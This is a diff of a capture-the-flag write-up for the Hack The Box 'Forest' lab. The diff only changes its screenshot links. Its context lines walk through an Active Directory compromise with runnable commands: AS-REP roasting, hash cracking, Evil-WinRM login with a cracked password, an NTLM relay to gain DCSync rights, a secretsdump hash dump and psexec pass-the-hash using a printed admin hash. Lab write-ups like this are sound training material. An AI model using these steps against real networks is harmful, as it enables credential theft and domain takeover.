@@ -18,7 +18,7 @@ Let's get started. As usual, nmap first
 nmap -T4 -p- -A -oN nmap.results forest.htb
 ```
 
-![](https://yaboygmoney.github.io/htb/images/forest/nmap.png)
+![](https://SOwl1.github.io/htb/images/forest/nmap.png)
 
 Lots going on here. Notably SMB (445), Kerberos (88), LDAP/S (389/636), and WinRM (5985). I launch enum4linux to start pulling back information
 
@@ -28,11 +28,11 @@ enum4linux -a forest.htb
 
 I was given a lot of information from this. First, we can see that the domain name is "HTB".
 
-![](https://yaboygmoney.github.io/htb/images/forest/domainName.png)
+![](https://SOwl1.github.io/htb/images/forest/domainName.png)
 
 In addition to that, I get a list of usernames (ones of particular interest are highlighted).
 
-![](https://yaboygmoney.github.io/htb/images/forest/userList.png)
+![](https://SOwl1.github.io/htb/images/forest/userList.png)
 
 With the given usernames discovered, I put them into a wordlist by copying the output above into users.txt and then running
 
@@ -42,7 +42,7 @@ cat users.txt | awk -F ":" '{print $5}' | awk -F " " '{print $1}' > userlist.txt
 
 The result is a cleaned up list
 
-![](https://yaboygmoney.github.io/htb/images/forest/userlist2.png)
+![](https://SOwl1.github.io/htb/images/forest/userlist2.png)
 
 Then I started to try and ASREPRoast my userlist. [This article](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/) has been really beneficial in learning how Kerberos actually works and how to get it to help my activities. The syntax is as follows:
 
@@ -56,7 +56,7 @@ So for this situation, the command is
 ./GetNPUsers.py HTB/ -usersfile userlist.txt -no-pass -dc-ip forest.htb
 ```
 
-![](https://yaboygmoney.github.io/htb/images/forest/roasted.png)
+![](https://SOwl1.github.io/htb/images/forest/roasted.png)
 
 It was a bunch of nothing until the very last user: svc-alfresco.
 
@@ -69,9 +69,9 @@ hashcat.exe -a -0 -m 18200 hash.txt rockyou.txt -O -o heresthepw.txt
 type heresthepw.txt
 ```
 
-![](https://yaboygmoney.github.io/htb/images/forest/hashcat.png)
+![](https://SOwl1.github.io/htb/images/forest/hashcat.png)
 
-![](https://yaboygmoney.github.io/htb/images/forest/cracked.png)
+![](https://SOwl1.github.io/htb/images/forest/cracked.png)
 
 With a username and password in hand, I spun up [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) and logged in
 
@@ -81,7 +81,7 @@ evil-winrm -i forest.htb -u svc-alfresco -p s3rvice
 
 User flag was hanging out on svc-alfresco's desktop
 
-![](https://yaboygmoney.github.io/htb/images/forest/user.png)
+![](https://SOwl1.github.io/htb/images/forest/user.png)
 
 Now it's time to find our way to administrator. The quickest way to do that in an AD environment is to unleash the hound. I downloaded the [SharpHound.ps1 ingestor](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1) to my local machine and then utilized Evil-WinRM's upload feature to get it onto the machine.
 
@@ -93,7 +93,7 @@ Invoke-Bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco
 
 A few seconds later I had a zip file containing information about the domain.
 
-![](https://yaboygmoney.github.io/htb/images/forest/hounded.png)
+![](https://SOwl1.github.io/htb/images/forest/hounded.png)
 
 Then just pull back the zip with Evil-WinRM's download utility
 
@@ -110,7 +110,7 @@ bloodhound
 
 Then it's as easy as dragging and dropping your zip file into the bloodhound interface. After a few seconds, Bloodhound is ready to show us the way. I typically click on "Queries" and then select "Find Shortest Path to Domain Admins". The result is something like
 
-![](https://yaboygmoney.github.io/htb/images/forest/path.png)
+![](https://SOwl1.github.io/htb/images/forest/path.png)
 
 The path shows that from my current svc-alfresco account, I can use my membership of the group "Service Accounts". Every member of "Service Accounts" inherits permission of the "Privileged IT Accounts" group. Every member of the "Privileged IT Accounts Group" is also a member of "Account Operators". "Account Operators" enjoy all of the permissions associated with "Exchange Windows Permissions", which is essentially [all permissions](https://duo.com/decipher/microsoft-exchange-users-get-admin-rights-in-privilege-escalation-attack). 
 
@@ -137,15 +137,15 @@ I also need to run [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/
 ./ntlmrelayx.py -t ldap://forest.htb --escalate-user ybgm
 ```
 
-![](https://yaboygmoney.github.io/htb/images/forest/server.png)
+![](https://SOwl1.github.io/htb/images/forest/server.png)
 
 This command spins up an HTTP server. Once I navigate to my localhost, the credentials will be requested and then relayed via LDAP to the DC.
 
-![](https://yaboygmoney.github.io/htb/images/forest/relay.png)
+![](https://SOwl1.github.io/htb/images/forest/relay.png)
 
 Back on the terminal, we can see that the credentials are relayed via LDAP. Because I added my user 'ybgm' to the Exhange Windows Permissions group, the user has "Modifying domain ACL skills". By leveraging this, my user is given the replicate changes ability needed to perform a DCSync.
 
-![](https://yaboygmoney.github.io/htb/images/forest/worked.png)
+![](https://SOwl1.github.io/htb/images/forest/worked.png)
 
 Now I can run [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to perform a DCSync and pull back hashes.
 
@@ -153,7 +153,7 @@ Now I can run [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/m
 ./secretsdump.py htb.local/ybgm:password@forest.htb -just-dc
 ```
 
-![](https://yaboygmoney.github.io/htb/images/forest/secretsdump.png)
+![](https://SOwl1.github.io/htb/images/forest/secretsdump.png)
 
 With the admin hash, I can use [PSExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) to get an administrative shell on the Domain Controller.
 
@@ -161,6 +161,6 @@ With the admin hash, I can use [PSExec](https://github.com/SecureAuthCorp/impack
 ./psexec.py htb.local/administrator@forest.htb 'powershell.exe' -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
 ```
 
-![](https://yaboygmoney.github.io/htb/images/forest/root.png)
+![](https://SOwl1.github.io/htb/images/forest/root.png)
 
 I want to end with a shoutout to the user [SmoZy](https://www.hackthebox.eu/profile/134223) who helped me get past a syntax hurdle I had with Bloodhound that allowed me to push forward. The HTB community is awesome and be sure to help when you can.
